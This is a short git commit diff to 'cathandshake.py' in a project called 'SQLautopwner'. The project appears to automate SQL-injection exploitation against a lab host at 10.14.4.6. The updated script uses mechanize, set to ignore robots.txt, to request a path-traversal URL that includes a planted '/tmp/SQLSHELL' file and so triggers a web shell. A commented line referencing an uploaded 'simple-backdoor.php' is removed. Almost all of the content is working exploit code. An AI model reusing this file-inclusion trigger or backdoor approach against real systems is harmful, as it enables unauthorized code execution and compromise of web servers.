9e535e43b107649711b11dde7969b06ac2c94b7c
amnash002 <30554241+amnash002@users.noreply.github.com>
2018-07-18 21:31:57 +0200

    Update cathandshake.py

--- SQLautopwner/cathandshake.py
+++ SQLautopwner/cathandshake.py
@@ -1,11 +1,16 @@
 import webbrowser
 import sys
 import time
+import requests as req
+import mechanize
 
-#possibly just wait a few seconds first
-
+# wait a few seconds first
 time.sleep(2)
 name = sys.argv[1]
 
-webbrowser.open('http://10.14.4.6/admin/index.php?page=../../../../tmp/SQLSHELL'+name,new=2)
-#webbrowser.open('http://10.14.4.6/upload/16/simple-backdoor.php',new=2)
+#use mechanize to connect
+url = 'http://10.14.4.6/admin/index.php?page=../../../../tmp/SQLSHELL'+name
+op = mechanize.Browser()
+op.set_handle_robots(False)
+op.open(url)
+
